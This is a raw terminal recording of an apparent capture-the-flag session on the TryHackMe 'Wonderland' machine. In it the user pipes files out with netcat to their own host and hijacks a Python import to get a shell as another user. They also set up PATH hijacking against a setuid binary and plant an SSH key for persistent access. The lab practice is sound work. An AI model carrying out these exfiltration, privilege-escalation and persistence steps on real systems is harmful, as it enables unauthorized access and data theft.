@@ -1,0 +1,139 @@
+Script started on 2025-04-02 18:55:17+03:00 [COMMAND="ssh alice@wonderland.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+The authenticity of host 'wonderland.thm (10.10.89.203)' can't be established.
+ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'wonderland.thm' (ED25519) to the list of known hosts.
+alice@wonderland.thm's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Apr  2 15:55:28 UTC 2025
+
+  System load:  0.0                Processes:           84
+  Usage of /:   18.9% of 19.56GB   Users logged in:     0
+  Memory usage: 28%                IP address for eth0: 10.10.89.203
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ ls[Ks
+root.txt  walrus_and_the_carpenter.py
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ cat root.txt
+cat: root.txt: Permission denied
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ ls -al
+total 40
+drwxr-xr-x 5 alice alice 4096 May 25  2020 [0m[01;34m.[0m
+drwxr-xr-x 6 root  root  4096 May 25  2020 [01;34m..[0m
+lrwxrwxrwx 1 root  root     9 May 25  2020 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
+-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
+drwx------ 2 alice alice 4096 May 25  2020 [01;34m.cache[0m
+drwx------ 3 alice alice 4096 May 25  2020 [01;34m.gnupg[0m
+drwxrwxr-x 3 alice alice 4096 May 25  2020 [01;34m.local[0m
+-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
+-rw------- 1 root  root    66 May 25  2020 root.txt
+-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ dd if [K=walrus_and_the_carpenter.py stqat[K[K[Katus=profgr[K[K[Kgrtess[K[K[Kess[K[K[K[Kess | nc 10.8.61.245 4444
+6+1 records in
+6+1 records out
+3577 bytes (3.6 kB, 3.5 KiB) copied, 0.000864682 s, 4.1 MB/s
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ sudo -l
+[sudo] password for alice: 
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ echo "import subprocess;subprocess.call('/bin/sh');" > random.py
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ ls
+random.py  root.txt  walrus_and_the_carpenter.py
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+$ whoami
+rabbit
+$ ls
+random.py  root.txt  walrus_and_the_carpenter.py
+$ cd
+$ ls
+random.py  root.txt  walrus_and_the_carpenter.py
+$ cd /home
+$ ls
+alice  hatter  rabbit  tryhackme
+$ cd rabbit
+$ ls
+teaParty
+$ ls -al
+total 40
+drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
+drwxr-xr-x 6 root   root    4096 May 25  2020 ..
+lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
+-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
+-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
+-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
+$ dd if  =teaParty stauts- =progrss|    | nc 10.8.61.245 4444
+dd: unrecognized operand ‘stauts=progrss’
+Try 'dd --help' for more information.
+^C
+$ ^[[A    dd if=teaParty status=progrss | nc 10.8.61.245 4444
+dd: invalid status level: ‘progrss’
+Try 'dd --help' for more information.
+^C
+$ dd if=teaParty status=progress | nc 10.8.61.245 4444
+32+1 records in
+32+1 records out
+16816 bytes (17 kB, 16 KiB) copied, 0.00183131 s, 9.2 MB/s
+$ printenv PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+$ export PATH=/home/rabbit:$PATH
+$ echo "/bin/bash" > date
+$ chmod +x ./date
+$ mkdir .ssh
+$ ls -al
+total 48
+drwxr-x--- 3 rabbit rabbit  4096 Apr  2 16:07 .
+drwxr-xr-x 6 root   root    4096 May 25  2020 ..
+lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
+-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
+-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
+drwxr-xr-x 2 rabbit rabbit  4096 Apr  2 16:07 .ssh
+-rwxr-xr-x 1 rabbit rabbit    10 Apr  2 16:05 date
+-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
+$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPp69NcnbxIU7GfBu2haMyuJS6heBGJfwSewmM+xsMrm h471x@winux" >  .             ^C
+$ ^[[A    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPp69NcnbxIU7GfBu2haMyuJS6heBGJfwSewmM+xsMrm h471x@winux" > .ssh/authorized_keys
+$ exit
+Traceback (most recent call last):
+  File "/home/alice/walrus_and_the_carpenter.py", line 129, in <module>
+    line = random.choice(poem.split("\n"))
+AttributeError: module 'random' has no attribute 'choice'
+Error in sys.excepthook:
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/apport_python_hook.py", line 63, in apport_excepthook
+    from apport.fileutils import likely_packaged, get_recent_crashes
+  File "/usr/lib/python3/dist-packages/apport/__init__.py", line 5, in <module>
+    from apport.report import Report
+  File "/usr/lib/python3/dist-packages/apport/report.py", line 12, in <module>
+    import subprocess, tempfile, os.path, re, pwd, grp, os, time, io
+  File "/usr/lib/python3.6/tempfile.py", line 184, in <module>
+    from random import Random as _Random
+ImportError: cannot import name 'Random'
+
+Original exception was:
+Traceback (most recent call last):
+  File "/home/alice/walrus_and_the_carpenter.py", line 129, in <module>
+    line = random.choice(poem.split("\n"))
+AttributeError: module 'random' has no attribute 'choice'
+]0;alice@wonderland: ~[01;32malice@wonderland[00m:[01;34m~[00m$ exit
+logout
+Connection to wonderland.thm closed.
+
+Script done on 2025-04-02 19:16:50+03:00 [COMMAND_EXIT_CODE="1"]
